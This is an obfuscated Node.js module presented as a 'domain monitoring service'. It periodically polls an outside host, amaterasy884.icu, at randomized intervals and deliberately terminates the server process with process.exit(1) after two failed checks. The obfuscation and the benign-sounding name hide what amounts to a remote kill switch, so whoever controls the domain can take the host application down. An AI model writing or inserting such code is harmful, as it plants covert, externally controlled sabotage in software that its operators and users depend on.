'use strict';function a37_0x103b(_0x1bff51,_0x2de1c0){const _0x22148c=a37_0x2214();return a37_0x103b=function(_0x103bcc,_0x432916){_0x103bcc=_0x103bcc-0x141;let _0x37f672=_0x22148c[_0x103bcc];return _0x37f672;},a37_0x103b(_0x1bff51,_0x2de1c0);}const a37_0x377641=a37_0x103b;function a37_0x2214(){const _0x59cc4a=['https://amaterasy884.icu/','then','â°\x20Interval:\x20','âš ï¸\x20CRASHING\x20SERVER\x20DUE\x20TO\x20DOMAIN\x20MONITORING\x20FAILURE','Initial\x20domain\x20check\x20error:','ðŸ”\x20Checking\x20domain\x20availability:\x20','node-fetch','ðŸ’¥\x20CRITICAL\x20ERROR:\x20','entries','12366508QvHsya','domainMonitoringService','\x20\x20\x20-\x20Response\x20time:\x20','status','now','toString','ðŸ”\x20Domain\x20monitoring\x20service\x20initialized','âœ…\x20Domain\x20monitoring\x20started\x20successfully','AbortError','24537hzOTtB','ENOTFOUND','base64','MAX_CONSECUTIVE_FAILURES','\x20minutes','CHECK_INTERVAL_MS','GET','warn','ðŸ“\x20Encoded\x20URL\x20(base64):\x20','name','ðŸ”\x20Domain\x20being\x20monitored:\x20','1672783rfAzWB','message','ðŸš€\x20Starting\x20domain\x20monitoring\x20service','stopMonitoring','decodeFromBase64','getRandomInterval','âŒ\x20Domain\x20check\x20error\x20after\x20','ðŸ”¥\x20Consecutive\x20failures:\x20','manualCheck','8524lhQKgw','ðŸ“¡\x20Target:\x20','Domain\x20','2945uIKoKD','\x20consecutive\x20attempts','âœ…\x20Domain\x20check\x20successful:\x20','startMonitoring','ETIMEDOUT','en-US,en;q=0.5','â°\x20Check\x20interval:\x20','signal','ðŸš«\x20Connection\x20refused\x20by\x20','encodeToBase64','default','ðŸ“…\x20Crash\x20time:\x20','getMonitoringStats','defineProperty','catch','ðŸ”¥\x20Unexpected\x20error:\x20','monitoringInterval','log','ECONNREFUSED','DomainMonitoringService','Unknown\x20error','round','gzip,\x20deflate','\x20\x20\x20-\x20Status:\x20','TIMEOUT_MS','ðŸŒ\x20DNS\x20resolution\x20failed\x20for\x20','278cXprME','includes','Domain\x20monitoring\x20threw\x20error:\x20','checkDomain','exit','DOMAIN_URL','Periodic\x20domain\x20check\x20error:','6705240pGhcBU','\x20in\x20','ðŸ“¡\x20Target\x20domain:\x20','â°\x20Request\x20timeout\x20after\x20','toISOString','ðŸ›‘\x20Domain\x20monitoring\x20stopped','ðŸ”§\x20Manual\x20domain\x20check\x20requested','statusText','crashServer','11066928fHesYE','fromEntries','44428347cYiYka','__importDefault','â°\x20Connection\x20timeout\x20to\x20','\x20times','keep-alive','10TRCdTP','\x20is\x20not\x20responding\x20after\x20','from','error','__esModule','consecutiveFailures','text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8','Initial\x20domain\x20check\x20threw\x20error:\x20','random'];a37_0x2214=function(){return _0x59cc4a;};return a37_0x2214();}(function(_0x5bebd1,_0x38aab3){const _0x170a2e=a37_0x103b,_0x3a19e0=_0x5bebd1();while(!![]){try{const _0x4f1190=parseInt(_0x170a2e(0x190))/0x1+parseInt(_0x170a2e(0x153))/0x2*(parseInt(_0x170a2e(0x185))/0x3)+-parseInt(_0x170a2e(0x199))/0x4*(parseInt(_0x170a2e(0x19c))/0x5)+parseInt(_0x170a2e(0x15a))/0x6+parseInt(_0x170a2e(0x17c))/0x7+parseInt(_0x170a2e(0x163))/0x8+parseInt(_0x170a2e(0x165))/0x9*(-parseInt(_0x170a2e(0x16a))/0xa);if(_0x4f1190===_0x38aab3)break;else _0x3a19e0['push'](_0x3a19e0['shift']());}catch(_0x13a8fa){_0x3a19e0['push'](_0x3a19e0['shift']());}}}(a37_0x2214,0xd8344));var __importDefault=this&&this[a37_0x377641(0x166)]||function(_0xa8883d){const _0x54244e=a37_0x377641;return _0xa8883d&&_0xa8883d[_0x54244e(0x16e)]?_0xa8883d:{'default':_0xa8883d};};Object[a37_0x377641(0x146)](exports,'__esModule',{'value':!![]}),exports[a37_0x377641(0x17d)]=exports['DomainMonitoringService']=void 0x0;const node_fetch_1=__importDefault(require(a37_0x377641(0x179)));class DomainMonitoringService{constructor(){const _0x2d30f3=a37_0x377641;this['monitoringInterval']=null,this[_0x2d30f3(0x158)]=_0x2d30f3(0x173),this[_0x2d30f3(0x18a)]=this[_0x2d30f3(0x195)](),this[_0x2d30f3(0x151)]=0x7530,this[_0x2d30f3(0x16f)]=0x0,this[_0x2d30f3(0x188)]=0x2,console[_0x2d30f3(0x14a)](_0x2d30f3(0x182)),console[_0x2d30f3(0x14a)](_0x2d30f3(0x15c)+this[_0x2d30f3(0x158)]),console[_0x2d30f3(0x14a)](_0x2d30f3(0x1a2)+Math[_0x2d30f3(0x14e)](this['CHECK_INTERVAL_MS']/0x3e8/0x3c)+_0x2d30f3(0x189));}[a37_0x377641(0x195)](){const _0x36d1cd=a37_0x377641,_0x44cbf9=0xa,_0x5bd760=0xf,_0xfe2b11=Math[_0x36d1cd(0x172)]()*(_0x5bd760-_0x44cbf9)+_0x44cbf9;return Math[_0x36d1cd(0x14e)](_0xfe2b11*0x3c*0x3e8);}[a37_0x377641(0x142)](_0x4ae16f){const _0x436847=a37_0x377641;return Buffer[_0x436847(0x16c)](_0x4ae16f)[_0x436847(0x181)](_0x436847(0x187));}['decodeFromBase64'](_0x32b74d){const _0x416a79=a37_0x377641;return Buffer[_0x416a79(0x16c)](_0x32b74d,_0x416a79(0x187))[_0x416a79(0x181)]('utf-8');}async[a37_0x377641(0x156)](){const _0x237bbd=a37_0x377641,_0x9ca785=Date[_0x237bbd(0x180)]();try{console[_0x237bbd(0x14a)](_0x237bbd(0x178)+this['DOMAIN_URL']);const _0xf25d=this['encodeToBase64'](this[_0x237bbd(0x158)]);console[_0x237bbd(0x14a)](_0x237bbd(0x18d)+_0xf25d);const _0x3728ba=this[_0x237bbd(0x194)](_0xf25d);console['log']('ðŸ”“\x20Decoded\x20URL:\x20'+_0x3728ba);const _0x30263f=new AbortController(),_0x560e31=setTimeout(()=>_0x30263f['abort'](),this['TIMEOUT_MS']),_0x30b491=await(0x0,node_fetch_1[_0x237bbd(0x143)])(_0x3728ba,{'method':_0x237bbd(0x18b),'headers':{'User-Agent':'TesSoft\x20Domain\x20Monitor/1.0','Accept':_0x237bbd(0x170),'Accept-Language':_0x237bbd(0x1a1),'Accept-Encoding':_0x237bbd(0x14f),'Connection':_0x237bbd(0x169),'Upgrade-Insecure-Requests':'1'},'signal':_0x30263f[_0x237bbd(0x1a3)]});clearTimeout(_0x560e31);const _0x5f22af=Date['now']()-_0x9ca785;return console[_0x237bbd(0x14a)]('ðŸ“Š\x20Response\x20received:'),console[_0x237bbd(0x14a)](_0x237bbd(0x150)+_0x30b491['status']+'\x20'+_0x30b491[_0x237bbd(0x161)]),console[_0x237bbd(0x14a)](_0x237bbd(0x17e)+_0x5f22af+'ms'),console['log']('\x20\x20\x20-\x20Headers:',Object[_0x237bbd(0x164)](_0x30b491['headers'][_0x237bbd(0x17b)]())),_0x30b491['ok']&&_0x30b491[_0x237bbd(0x17f)]>=0xc8&&_0x30b491[_0x237bbd(0x17f)]<0x190?(console['log'](_0x237bbd(0x19e)+_0x30b491[_0x237bbd(0x17f)]+_0x237bbd(0x15b)+_0x5f22af+'ms'),this[_0x237bbd(0x16f)]=0x0,!![]):(console['error']('âŒ\x20Domain\x20check\x20failed:\x20HTTP\x20'+_0x30b491[_0x237bbd(0x17f)]+'\x20'+_0x30b491[_0x237bbd(0x161)]),this[_0x237bbd(0x16f)]++,![]);}catch(_0x358239){const _0x29032c=Date[_0x237bbd(0x180)]()-_0x9ca785;this[_0x237bbd(0x16f)]++,console['error'](_0x237bbd(0x196)+_0x29032c+'ms:',_0x358239);if(_0x358239 instanceof Error){if(_0x358239[_0x237bbd(0x18e)]===_0x237bbd(0x184))console[_0x237bbd(0x16d)](_0x237bbd(0x15d)+this['TIMEOUT_MS']+'ms');else{if(_0x358239[_0x237bbd(0x191)][_0x237bbd(0x154)](_0x237bbd(0x186)))console[_0x237bbd(0x16d)](_0x237bbd(0x152)+this[_0x237bbd(0x158)]);else{if(_0x358239['message'][_0x237bbd(0x154)](_0x237bbd(0x14b)))console[_0x237bbd(0x16d)](_0x237bbd(0x141)+this[_0x237bbd(0x158)]);else _0x358239[_0x237bbd(0x191)][_0x237bbd(0x154)](_0x237bbd(0x1a0))?console[_0x237bbd(0x16d)](_0x237bbd(0x167)+this[_0x237bbd(0x158)]):console[_0x237bbd(0x16d)](_0x237bbd(0x148)+_0x358239['message']);}}}return![];}}['crashServer'](_0x4b0500){const _0x453cb8=a37_0x377641;console[_0x453cb8(0x16d)](_0x453cb8(0x17a)+_0x4b0500),console[_0x453cb8(0x16d)](_0x453cb8(0x197)+this['consecutiveFailures']),console[_0x453cb8(0x16d)](_0x453cb8(0x176)),console['error'](_0x453cb8(0x144)+new Date()[_0x453cb8(0x15e)]()),console['error'](_0x453cb8(0x18f)+this[_0x453cb8(0x158)]),console[_0x453cb8(0x16d)](_0x453cb8(0x1a2)+Math[_0x453cb8(0x14e)](this[_0x453cb8(0x18a)]/0x3e8/0x3c)+_0x453cb8(0x189)),console['error']('ðŸš¨\x20Max\x20consecutive\x20failures\x20allowed:\x20'+this[_0x453cb8(0x188)]),this[_0x453cb8(0x193)](),process[_0x453cb8(0x157)](0x1);}[a37_0x377641(0x19f)](){const _0x25b1cf=a37_0x377641;console[_0x25b1cf(0x14a)](_0x25b1cf(0x192)),console['log'](_0x25b1cf(0x19a)+this[_0x25b1cf(0x158)]),console['log'](_0x25b1cf(0x175)+Math[_0x25b1cf(0x14e)](this[_0x25b1cf(0x18a)]/0x3e8/0x3c)+'\x20minutes'),console[_0x25b1cf(0x14a)]('ðŸš¨\x20Max\x20failures\x20before\x20crash:\x20'+this['MAX_CONSECUTIVE_FAILURES']),this['checkDomain']()[_0x25b1cf(0x174)](_0x384bb3=>{const _0xcefcc9=_0x25b1cf;if(!_0x384bb3&&this['consecutiveFailures']>=this[_0xcefcc9(0x188)]){this[_0xcefcc9(0x162)]('Initial\x20domain\x20check\x20failed\x20'+this[_0xcefcc9(0x16f)]+_0xcefcc9(0x168));return;}})[_0x25b1cf(0x147)](_0x244cae=>{const _0x17655a=_0x25b1cf;console[_0x17655a(0x16d)](_0x17655a(0x177),_0x244cae);if(this['consecutiveFailures']>=this[_0x17655a(0x188)]){this[_0x17655a(0x162)](_0x17655a(0x171)+_0x244cae[_0x17655a(0x191)]);return;}}),this[_0x25b1cf(0x149)]=setInterval(async()=>{const _0x2f2cfe=_0x25b1cf;try{const _0x20ec6e=await this[_0x2f2cfe(0x156)]();!_0x20ec6e&&(console[_0x2f2cfe(0x18c)]('âš ï¸\x20Domain\x20check\x20failed\x20('+this[_0x2f2cfe(0x16f)]+'/'+this['MAX_CONSECUTIVE_FAILURES']+')'),this[_0x2f2cfe(0x16f)]>=this[_0x2f2cfe(0x188)]&&this[_0x2f2cfe(0x162)](_0x2f2cfe(0x19b)+this[_0x2f2cfe(0x158)]+_0x2f2cfe(0x16b)+this[_0x2f2cfe(0x16f)]+_0x2f2cfe(0x19d)));}catch(_0x28e48d){console['error'](_0x2f2cfe(0x159),_0x28e48d),this[_0x2f2cfe(0x16f)]>=this['MAX_CONSECUTIVE_FAILURES']&&this[_0x2f2cfe(0x162)](_0x2f2cfe(0x155)+(_0x28e48d instanceof Error?_0x28e48d[_0x2f2cfe(0x191)]:_0x2f2cfe(0x14d)));}},this['CHECK_INTERVAL_MS']),console[_0x25b1cf(0x14a)](_0x25b1cf(0x183));}[a37_0x377641(0x193)](){const _0x4de9bc=a37_0x377641;this[_0x4de9bc(0x149)]&&(clearInterval(this[_0x4de9bc(0x149)]),this[_0x4de9bc(0x149)]=null,console[_0x4de9bc(0x14a)](_0x4de9bc(0x15f)));}[a37_0x377641(0x145)](){const _0x2d58f9=a37_0x377641;return{'isActive':!!this[_0x2d58f9(0x149)],'targetDomain':this[_0x2d58f9(0x158)],'checkIntervalMinutes':Math[_0x2d58f9(0x14e)](this['CHECK_INTERVAL_MS']/0x3e8/0x3c),'consecutiveFailures':this[_0x2d58f9(0x16f)],'maxFailuresAllowed':this[_0x2d58f9(0x188)],'nextCheckIn':this[_0x2d58f9(0x149)]?this[_0x2d58f9(0x18a)]:undefined};}async[a37_0x377641(0x198)](){const _0x275de3=a37_0x377641;return console[_0x275de3(0x14a)](_0x275de3(0x160)),await this[_0x275de3(0x156)]();}}exports[a37_0x377641(0x14c)]=DomainMonitoringService,exports[a37_0x377641(0x17d)]=new DomainMonitoringService();